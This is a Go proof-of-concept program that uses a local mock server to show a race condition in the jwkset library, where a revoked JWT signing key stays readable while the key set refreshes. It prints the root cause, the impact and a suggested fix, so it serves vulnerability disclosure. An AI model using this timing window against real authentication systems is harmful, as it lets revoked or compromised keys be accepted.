package main

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/MicahParks/jwkset"
)

// makeJWKS creates a JWKS JSON string with the given key IDs
func makeJWKS(kids []string) string {
	var b strings.Builder
	b.WriteString(`{"keys":[`)
	for i, kid := range kids {
		if i > 0 {
			b.WriteString(",")
		}
		// kty=oct, k is base64url-encoded (here "QUFBQQ" = "AAAA")
		b.WriteString(`{"kty":"oct","k":"QUFBQQ","kid":"`)
		b.WriteString(kid)
		b.WriteString(`"}`)
	}
	b.WriteString(`]}`)
	return b.String()
}

// itoa converts int to string without fmt dependency
func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	var buf [32]byte
	pos := len(buf)
	for i > 0 {
		pos--
		buf[pos] = byte('0' + i%10)
		i /= 10
	}
	return string(buf[pos:])
}

func main() {
	fmt.Println("=== JWKSET Race Condition POC ===")
	fmt.Println("This POC demonstrates a race condition vulnerability where revoked keys")
	fmt.Println("remain accessible after new keys have been added during refresh.\n")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// Step 1: Initially only "old" key exists
	fmt.Println("[*] Step 1: Server has only 'old' key")
	oldJWKS := makeJWKS([]string{"old"})
	fmt.Printf("    Initial JWKS: %s\n\n", oldJWKS)

	// Step 2: Prepare new keys (excluding "old" - simulating key revocation)
	const n = 2000
	newKids := make([]string, 0, n)
	for i := 0; i < n; i++ {
		newKids = append(newKids, "new-"+itoa(i))
	}
	newJWKS := makeJWKS(newKids)
	fmt.Printf("[*] Step 2: Prepared %d new keys (key 'old' will be revoked)\n\n", n)

	// Step 3: Setup mock HTTP server
	var mu sync.Mutex
	current := oldJWKS

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		body := current
		mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(body))
	}))
	defer srv.Close()

	u, err := url.Parse(srv.URL)
	if err != nil {
		panic(fmt.Sprintf("url.Parse: %v", err))
	}

	fmt.Printf("[*] Step 3: Started mock JWKS server at %s\n\n", srv.URL)

	// Step 4: Create storage with auto-refresh
	fmt.Println("[*] Step 4: Creating JWKSET storage with 10ms refresh interval")
	st, err := jwkset.NewStorageFromHTTP(u, jwkset.HTTPClientStorageOptions{
		Client:             srv.Client(),
		HTTPMethod:         http.MethodGet,
		HTTPExpectedStatus: http.StatusOK,
		Ctx:                ctx,
		RefreshInterval:    10 * time.Millisecond,
	})
	if err != nil {
		panic(fmt.Sprintf("NewStorageFromHTTP: %v", err))
	}

	// Step 5: Verify "old" key exists initially
	fmt.Println("[*] Step 5: Verifying 'old' key exists")
	if _, err := st.KeyRead(ctx, "old"); err != nil {
		panic(fmt.Sprintf("expected 'old' to exist initially, got err: %v", err))
	}
	fmt.Println("    ✓ Key 'old' is readable\n")

	// Step 6: REVOKE the old key by switching to new JWKS
	fmt.Println("[*] Step 6: REVOKING key 'old' - switching server to new JWKS")
	mu.Lock()
	current = newJWKS
	mu.Unlock()
	fmt.Println("    Server now returns new keys (without 'old')\n")

	// Step 7: Wait for refresh to start
	fmt.Println("[*] Step 7: Waiting for auto-refresh to fetch new keys...")
	deadline := time.Now().Add(6 * time.Second)
	for {
		if time.Now().After(deadline) {
			panic("timeout waiting for new-0 to appear (refresh may not be running)")
		}
		if _, err := st.KeyRead(ctx, "new-0"); err == nil {
			fmt.Println("    ✓ New key 'new-0' is now readable (refresh has started)\n")
			break
		}
		time.Sleep(2 * time.Millisecond)
	}

	// Step 8: THE CRITICAL TEST - Check if revoked key is still readable
	fmt.Println("[*] Step 8: CRITICAL TEST - Checking if revoked key 'old' is still accessible")
	fmt.Println("    Expected: Key 'old' should NOT be readable (it was revoked)")
	fmt.Print("    Actual:   ")

	if _, err := st.KeyRead(ctx, "old"); err == nil {
		fmt.Println("Key 'old' is STILL READABLE! ❌")
		fmt.Println("\n" + strings.Repeat("=", 70))
		fmt.Println("🔥 VULNERABILITY CONFIRMED 🔥")
		fmt.Println(strings.Repeat("=", 70))
		fmt.Println("\nThe revoked key 'old' is still accessible even after new keys appeared!")
		fmt.Println("This is a RACE CONDITION vulnerability.")
		fmt.Println("\nRoot cause:")
		fmt.Println("  The current implementation writes new keys BEFORE deleting old ones.")
		fmt.Println("  This creates a window where revoked keys remain accessible.")
		fmt.Println("\nSecurity impact:")
		fmt.Println("  - Revoked/compromised keys can still be used for authentication")
		fmt.Println("  - Key rotation doesn't immediately invalidate old keys")
		fmt.Println("  - Attackers could exploit this timing window")
		fmt.Println("\nRecommended fix:")
		fmt.Println("  Clear/delete old keys FIRST, then write new keys atomically.")
		fmt.Println(strings.Repeat("=", 70))
	} else {
		fmt.Println("Key 'old' is NOT readable ✓")
		fmt.Println("\n✓ No vulnerability detected - revoked key properly removed")
	}
}
